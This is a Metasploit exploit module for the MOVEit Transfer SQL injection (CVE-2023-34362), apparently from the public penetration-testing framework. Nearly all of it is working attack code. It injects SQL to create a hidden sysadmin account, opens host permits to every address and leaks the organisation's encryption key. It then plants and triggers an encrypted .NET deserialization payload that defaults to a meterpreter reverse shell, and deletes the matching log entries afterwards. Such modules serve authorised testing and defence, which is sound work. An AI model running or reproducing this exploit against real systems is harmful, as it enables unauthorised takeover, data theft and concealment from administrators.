##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'MOVEit SQL Injection vulnerability',
        'Description' => %q{
          This module exploits an SQL injection vulnerability in the MOVEit Transfer web application
          that allows an unauthenticated attacker to gain access to MOVEit Transfer's database.
          Depending on the database engine being used (MySQL, Microsoft SQL Server, or Azure SQL), an
          attacker can leverage an information leak be able to upload a .NET deserialization payload.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'sfewer-r7', # PoC https://github.com/sfewer-r7/CVE-2023-34362
          'rbowes-r7', # research
          'bwatters-r7' # module
        ],
        'References' => [
          ['CVE', '2023-34362' ],
          ['URL', 'https://github.com/sfewer-r7/CVE-2023-34362'],
          ['URL', 'https://attackerkb.com/topics/mXmV0YpC3W/cve-2023-34362/rapid7-analysis'],
          ['URL', 'https://www.wiz.io/blog/cve-2023-34362']
        ],
        'Platform' => 'win',
        'Arch' => [ARCH_CMD],
        'Payload' => {
          'Space' => 345
        },
        'Targets' => [
          [
            'Windows Command',
            {
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/windows/http/x64/meterpreter/reverse_tcp',
                'RPORT' => 443,
                'SSL' => true
              }
            }
          ],
        ],
        'DisclosureDate' => '2023-05-31',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [ CRASH_SAFE ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ]
        }
      )
    )
    register_options(
      [
        Msf::OptString.new('TARGET_URI', [ false, 'Target URI', '/api/v1/token']),
        Msf::OptString.new('USERNAME', [ true, 'Username', Rex::Text.rand_text_alphanumeric(5..11)]),
        Msf::OptString.new('LOGIN_NAME', [ true, 'Login Name', Rex::Text.rand_text_alphanumeric(5..11)]),
        Msf::OptString.new('PASSWORD', [ true, 'Password', Rex::Text.rand_text_alphanumeric(5..11)])
      ]
    )
    @moveit_token = nil
    @moveit_instid = nil
    @guest_email_addr = "#{Rex::Text.rand_text_alphanumeric(5..12)}@#{Rex::Text.rand_text_alphanumeric(3..6)}.com"
    @uploadfile_name = Rex::Text.rand_text_alphanumeric(8..15)
    @uploadfile_size = rand(5..64)
    @uploadfile_data = Rex::Text.rand_text_alphanumeric(@uploadfile_size)
    @user_added = false
    @files_json = nil
  end

  def begin_file_upload(folders_json, token_json)
    boundary = rand_text_numeric(27)
    post_data = "--#{boundary}\r\n"
    post_data << "Content-Disposition: form-data; name=\"name\"\r\n\r\n#{@uploadfile_name}\r\n--#{boundary}\r\n"
    post_data << "Content-Disposition: form-data; name=\"size\"\r\n\r\n#{@uploadfile_size}\r\n--#{boundary}\r\n"
    post_data << "Content-Disposition: form-data; name=\"comments\"\r\n\r\n\r\n--#{boundary}--\r\n"
    res = send_request_raw({
      'method' => 'POST',
      'uri' => normalize_uri("/api/v1/folders/#{folders_json['items'][0]['id']}/files?uploadType=resumable"),
      'headers' => {
        'Content-Type' => 'multipart/form-data; boundary=' + boundary,
        'Authorization' => "Bearer #{token_json['access_token']}"
      },
      'connection' => 'close',
      'accept' => '*/*',
      'data' => post_data.to_s
    })

    fail_with(Msf::Exploit::Failure::Unknown, "Couldn't post API files #1 (#{files_response.body})") if res.nil? || res.code != 200

    files_json = res.get_json_document
    vprint_status("Initiated resumable file upload for fileId '#{files_json['fileId']}'...")
    files_json
  end

  def check
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri('moveitisapi/moveitisapi.dll?action=capa'),
      'connection' => 'close',
      'accept' => '*/*'
    })
    version = nil
    if res && res.code == 200 && res.headers.key?('X-MOVEitISAPI-Version')
      version = Rex::Version.new(res.headers['X-MOVEitISAPI-Version'])
      # 2020.1.x AKA 12.1.x
      return Exploit::CheckCode::Appears if version >= Rex::Version.new('12.1.0') && version < Rex::Version.new('12.1.10')
      # 2021.0.x AKA 13.0.x
      return Exploit::CheckCode::Appears if version >= Rex::Version.new('13.0.0') && version < Rex::Version.new('13.0.8')
      # 2021.1.x AKA 13.1.x
      return Exploit::CheckCode::Appears if version >= Rex::Version.new('13.1.0') && version < Rex::Version.new('13.1.6')
      # 2022.0.x AKA 14.0.x
      return Exploit::CheckCode::Appears if version >= Rex::Version.new('14.0.0') && version < Rex::Version.new('14.0.6')
      # 2022.1.x AKA 14.1.x
      return Exploit::CheckCode::Appears if version >= Rex::Version.new('14.1.0') && version < Rex::Version.new('14.1.7')
      # 2023.0.x AKA 15.0.x
      return Exploit::CheckCode::Appears if version >= Rex::Version.new('15.0.0') && version < Rex::Version.new('15.0.3')
    else
      return Exploit::CheckCode::Safe
    end
    return Exploit::CheckCode::Unknown
  end

  def cleanup
    cleanup_user(@files_json) if @user_added
    super
  end

  def cleanup_user(files_json)
    hax_username = datastore['USERNAME']
    hax_loginname = datastore['LOGIN_NAME']
    deleteuser_payload = [
      "DELETE FROM moveittransfer.fileuploadinfo WHERE FileID='#{files_json['fileId']}'", # delete the deserialization payload
      "DELETE FROM moveittransfer.files WHERE UploadUsername='#{hax_username}'", # delete the file we uploaded
      "DELETE FROM moveittransfer.activesessions WHERE Username='#{hax_username}'",
      "DELETE FROM moveittransfer.users WHERE Username='#{hax_username}'", # delete the user account we created
      "DELETE FROM moveittransfer.log WHERE Username='#{hax_username}'", # The web ASP stuff logs by username
      "DELETE FROM moveittransfer.log WHERE Username='#{hax_loginname}'", # The API logs by loginname
      "DELETE FROM moveittransfer.log WHERE Username='Guest:#{@guest_email_addr}'", # The SQLi generates a guest log entry.
    ]
    if @user_added
      vprint_status("Deleting user #{hax_username}")
      sqli(sqli_payload(deleteuser_payload))
      @user_added = false
    end
  end

  def create_sysadmin
    hax_username = datastore['USERNAME']
    hax_password = datastore['PASSWORD']
    hax_loginname = datastore['LOGIN_NAME']
    createuser_payload = [
      "UPDATE moveittransfer.hostpermits SET Host='*.*.*.*' WHERE Host!='*.*.*.*'",
      "INSERT INTO moveittransfer.users (Username) VALUES ('#{hax_username}')",
      "UPDATE moveittransfer.users SET LoginName='#{hax_loginname}' WHERE Username='#{hax_username}'",
      "UPDATE moveittransfer.users SET InstID='#{@moveit_instid}' WHERE Username='#{hax_username}'",
      "UPDATE moveittransfer.users SET Password='#{makev1password(hax_password, Rex::Text.rand_text_alphanumeric(4))}' WHERE Username='#{hax_username}'",
      "UPDATE moveittransfer.users SET Permission='40' WHERE Username='#{hax_username}'",
      "UPDATE moveittransfer.users SET CreateStamp=NOW() WHERE Username='#{hax_username}'",
    ]
    res = sqli(sqli_payload(createuser_payload))

    fail_with(Msf::Exploit::Failure::Unknown, "Couldn't perform initial SQLi (#{res.body})") if res.code != 200
    @user_added = true
  end

  def encrypt_deserialization_gadget(gadget, org_key)
    org_key = org_key.gsub(' ', '')
    org_key = [org_key].pack('H*').bytes.pack('C*')
    deserialization_gadget = moveitv2encrypt(gadget, org_key)
    deserialization_gadget
  end

  def find_folder_id(token_json)
    folders_response = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri('/api/v1/folders'),
      'connection' => 'close',
      'accept' => '*/*',
      'headers' => {
        'Authorization' => "Bearer #{token_json['access_token']}"
      }
    })
    fail_with(Msf::Exploit::Failure::Unknown, "Couldn't get API folders (#{folders_response.body})") if folders_response.nil? || folders_response.code != 200
    folders_json = JSON.parse(folders_response.body)
    vprint_status("Found folderId '#{folders_json['items'][0]['id']}'.")
    folders_json
  end

  def get_csrf_token(res)
    fail_with(Msf::Exploit::Failure::Unknown, 'No csrf token, or my code is bad') unless res.to_s.split(/\n/).join =~ /.*csrftoken" value="([a-f0-9]*)"/
    ::Regexp.last_match(1)
  end

  def guestaccess_request(body)
    res = send_request_cgi({
      'method' => 'POST',
      'keep_cookies' => true,
      'uri' => normalize_uri('guestaccess.aspx'),
      'connection' => 'close',
      'accept' => '*/*',
      'vars_post' => body
    })
    res
  end

  # Perform a request to the ISAPI endpoint with an arbitrary transaction
  def isapi_request(transaction, headers)
    send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri('moveitisapi/moveitisapi.dll?action=m2'),
      'keep_cookies' => true,
      'connection' => 'close',
      'accept' => '*/*',
      'headers' => {
        'X-siLock-Test': 'abcdX-SILOCK-Transaction: folder_add_by_path',
        'X-siLock-Transaction': transaction
      }.merge(headers)
    })
  end

  def leak_encryption_key(token_json, files_json)
    haxleak_payload = [
      # The \ gets escaped, so we leverage CHAR_LENGTH(39) to get the key we want (Standard Networks\siLock\Institutions\0) as all other KeyName's will be longer (Standard Networks\siLock\Institutions\1234)
      "UPDATE moveittransfer.files SET UploadAgentBrand=(SELECT PairValue FROM moveittransfer.registryaudit WHERE PairName='Key' AND CHAR_LENGTH(KeyName)=#{'Standard Networks\siLock\Institutions\0'.length}) WHERE ID='#{files_json['fileId']}'"
    ]

    sqli(sqli_payload(haxleak_payload))

    leak_response = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri("/api/v1/files/#{files_json['fileId']}"),
      'connection' => 'close',
      'accept' => '*/*',
      'headers' => {
        'Authorization' => "Bearer #{token_json['access_token']}"
      }
    })

    fail_with(Msf::Exploit::Failure::Unknown, "Couldn't post API files #LEAK (#{leak_response.body})") if leak_response.nil? || leak_response.code != 200
    leak_json = JSON.parse(leak_response.body)
    org_key = leak_json['uploadAgentBrand']
    vprint_status("Leaked the Org Key: #{org_key}")
    org_key
  end

  def makev1password(password, salt = 'AAAA')
    fail_with(Msf::Exploit::Failure::BadConfig, 'password cannot be empty') if password.empty?
    fail_with(Msf::Exploit::Failure::BadConfig, 'salt must be 4 bytes') if salt.length != 4

    # These two hardcoded values are found in MOVEit.DMZ.Core.Cryptography.Providers.SecretProvider.GetSecret
    pwpre = Base64.decode64('=VT2jkEH3vAs=')
    pwpost = Base64.decode64('=0maaSIA5oy0=')
    md5 = Digest::MD5.new
    md5.update(pwpre)
    md5.update(salt)
    md5.update(password)
    md5.update(pwpost)

    pw = [(4 + 4 + 16), 0, 0, 0].pack('CCCC')
    pw << salt
    pw << md5.digest

    return Base64.strict_encode64(pw).gsub('+', '-')
  end

  def moveitv2encrypt(data, org_key, iv = nil, tag = '@%!')
    fail_with(Msf::Exploit::Failure::BadConfig, 'org_key must be 16 bytyes') if org_key.length != 16

    if iv.nil?
      iv = Rex::Text.rand_text_alphanumeric(4)
      # as we only store the first 4 bytes in the header, the IV must be a repeating 4 byte sequence.
      iv *= 4
    end

    # MOVEit.DMZ.Core.Cryptography.Encryption
    key = [64, 131, 232, 51, 134, 103, 230, 30, 48, 86, 253, 157].pack('C*')
    key += org_key
    key += [0, 0, 0, 0].pack('C*')

    # MOVEit.Crypto.AesMOVEitCryptoTransform
    cipher = OpenSSL::Cipher.new('AES-256-CBC')

    cipher.encrypt
    cipher.key = key
    cipher.iv = iv
    encrypted_data = cipher.update(data) + cipher.final
    data_sha1_hash = Digest::SHA1.digest(data).unpack('C*')
    org_key_sha1_hash = Digest::SHA1.digest(org_key).unpack('C*')

    # MOVEit.DMZ.Core.Cryptography.Providers.MOVEit.MOVEitV2EncryptedStringHeader
    header = [
      225, # MOVEitV2EncryptedStringHeader
      0,
      data_sha1_hash[0],
      data_sha1_hash[1],
      org_key_sha1_hash[0],
      org_key_sha1_hash[1],
      org_key_sha1_hash[2],
      org_key_sha1_hash[3],
      iv.unpack('C*')[0],
      iv.unpack('C*')[1],
      iv.unpack('C*')[2],
      iv.unpack('C*')[3],
    ].pack('C*')

    # MOVEit.DMZ.Core.Cryptography.Encryption
    return tag + Base64.strict_encode64(header + encrypted_data)
  end

  def populate_token_instid
    begin
      res = send_request_cgi({
        'method' => 'GET',
        'keep_cookies' => true,
        'connection' => 'keep-alive',
        'accept' => '*/*'
      })

      cookies = res.get_cookies
      # Get the session id from the cookies
      fail_with(Msf::Exploit::Failure::Unknown, 'Could not find token from cookies!') unless cookies =~ /ASP.NET_SessionId=([a-z0-9]+);/
      @moveit_token = ::Regexp.last_match(1)
      vprint_status("Received ASP.NET_SessionId cookie: #{@moveit_token}")

      # Get the InstID from the cookies
      fail_with(Msf::Exploit::Failure::Unknown, 'Could not find InstID from cookies!') unless cookies =~ /siLockLongTermInstID=([0-9]+);/
      @moveit_instid = ::Regexp.last_match(1)
      vprint_status("Received siLockLongTermInstID cookie: #{@moveit_instid}")
    end
    true
  end

  def request_api_token
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri('/api/v1/token'),
      'Content-Type' => 'application/x-www-form-urlencoded',
      'connection' => 'keep-alive',
      'accept' => '*/*',
      'vars_post' => {
        'grant_type' => 'password',
        'username' => datastore['LOGIN_NAME'],
        'password' => datastore['PASSWORD']
      }
    })

    fail_with(Msf::Exploit::Failure::Unknown, "Couldn't get API token (#{res.body})") if res.code != 200

    token_json = JSON.parse(res.body)
    vprint_status("Got API access token='#{token_json['access_token']}'.")
    token_json
  end

  def set_session(session_hash)
    session_vars = {}
    session_index = 0
    session_hash.each_pair do |k, v|
      session_vars["X-siLock-SessVar#{session_index}"] = "#{k}: #{v}"
      session_index += 1
    end
    isapi_request('session_setvars', session_vars)
  end

  def sqli(sql_payload)
    # Set up a fake package in the session. The order here is important. We set these session
    # variables one per request, so first set the package information, then switch over to a
    # 'Guest' username to allow the CSRF/injection to work as expected. If we don't do this
    # order the session will be cleared and the injection will not work.
    set_session({
      'MyPkgAccessCode' => 'accesscode', # Must match the final request Arg06
      'MyPkgID' => '0', # Is self provisioned? (must be 0)
      'MyGuestEmailAddr' => @guest_email_addr, # Must be a valid email address @ MOVEit.DMZ.ClassLib.dll/MOVEit.DMZ.ClassLib/MsgEngine.cs
      'MyPkgInstID' => '1234', # this can be any int value
      'MyPkgSelfProvisionedRecips' => sql_payload,
      'MyUsername' => 'Guest'
    })

    # Get a CSRF token - this has to be *after* you set MyUsername, since the
    # username is incorporated into it
    #
    # Transaction => request type, different types will work
    # Arg06 => the package access code (must match what's set above)
    # Arg12 => promptaccesscode requests a form, which contains a CSRF code

    body = { 'Transaction' => 'dummy', 'Arg06' => 'accesscode', 'Arg12' => 'promptaccesscode' }
    csrf = get_csrf_token(guestaccess_request(body))

    # This does the actual injection
    body = {
      'Arg06' => 'accesscode',
      'transaction' => 'secmsgpost',
      'Arg01' => 'subject',
      'Arg04' => 'body',
      'Arg05' => 'sendauto',
      'Arg09' => 'pkgtest9',
      'csrftoken' => csrf
    }
    guestaccess_request(body)
  end

  def sqli_payload(sql_payload)
    # Create the initial injection, and create the session object
    payload = [
      # The initial injection
      "#{Rex::Text.rand_text_alphanumeric(8)}@#{Rex::Text.rand_text_alphanumeric(8)}.com')",
    ].concat(sql_payload)

    # Join our payload, and terminate with a comment character
    return payload.join(';') + ';#'
  end

  def trigger_deserialization(token_json, files_json, folders_json)
    files_response = send_request_cgi({
      'method' => 'PUT',
      'uri' => normalize_uri("/api/v1/folders/#{folders_json['items'][0]['id']}/files?uploadType=resumable&fileId=#{files_json['fileId']}"),
      'connection' => 'close',
      'accept' => '*/*',
      'verify' => false,
      'headers' => {
        'Authorization' => "Bearer #{token_json['access_token']}",
        'Content-Type' => 'application/octet-stream',
        'Content-Range' => "bytes 0-#{@uploadfile_size - 1}/#{@uploadfile_size}",
        'X-File-Hash' => Digest::SHA1.hexdigest(@uploadfile_data)
      },
      'data' => @uploadfile_data
    })

    # 500 if payload runs :)
    fail_with(Msf::Exploit::Failure::Unknown, "Couldn't post API files #2 code=#{files_response.code} (#{files_response.body})") if files_response.code != 500
  end

  def upload_encrypted_gadget(encrypted_gadget, files_json)
    haxupload_payload = [
      "UPDATE moveittransfer.fileuploadinfo SET State='#{encrypted_gadget}' WHERE FileID='#{files_json['fileId']}'",
    ]
    vprint_status('Planting encrypted gadget into the DB...')
    sqli(sqli_payload(haxupload_payload))
  end

  def exploit
    # Get the sessionID and siLockLongTermInstID
    print_status('[01/11] Get the sessionID and siLockLongTermInstID')
    populate_token_instid
    # Allow Remote Access and Create new sysAd
    print_status('[02/11] Create New Sysadmin')
    create_sysadmin
    print_status('[03/11] Get API Token')
    token_json = request_api_token
    print_status('[04/11] Get Folder ID')
    folders_json = find_folder_id(token_json)
    print_status('[05/11] Begin File Upload')
    @files_json = begin_file_upload(folders_json, token_json)
    print_status('[06/11] Leak Encryption Key')
    org_key = leak_encryption_key(token_json, @files_json)
    print_status('[07/11] Generate Gadget')
    gadget = ::Msf::Util::DotNetDeserialization.generate(
      payload.encoded,
      gadget_chain: :TextFormattingRunProperties,
      formatter: :BinaryFormatter
    )
    print_status('[08/11] Encrypt Gadget')
    b64_gadget = Rex::Text.encode_base64(gadget)
    encrypted_gadget = encrypt_deserialization_gadget(b64_gadget, org_key)
    print_status('[09/11] Upload Encrypted Gadget')
    upload_encrypted_gadget(encrypted_gadget, @files_json)
    print_status('[10/11] Trigger Gadget')
    trigger_deserialization(token_json, @files_json, folders_json)
    print_status('[11/11] Cleaning Up')
    cleanup_user(@files_json)
  end
end
